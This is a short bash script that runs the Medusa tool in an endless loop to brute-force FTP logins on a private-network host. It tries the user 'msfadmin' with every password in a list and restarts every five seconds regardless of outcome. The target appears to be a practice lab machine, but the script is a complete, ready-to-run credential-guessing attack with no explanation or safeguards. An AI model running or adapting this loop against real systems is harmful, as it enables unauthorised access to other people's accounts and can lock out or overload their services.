#!/bin/bash

# chmod +x repeat_medusa.sh
# ./repeat_medusa.sh

# Define the Medusa command
MEDUSA_CMD="medusa -h 192.168.1.100 -u msfadmin -P password_list.txt -M ftp -n 21"

# Loop to continually run the Medusa command
while true; do
    # Run the Medusa command
    $MEDUSA_CMD

    # Check the exit status of the Medusa command
    if [ $? -eq 0 ]; then
        echo "Medusa command completed successfully. Restarting..."
    else
        echo "Medusa command failed. Restarting..."
    fi

    # Add a sleep interval to avoid rapid looping
    sleep 5
done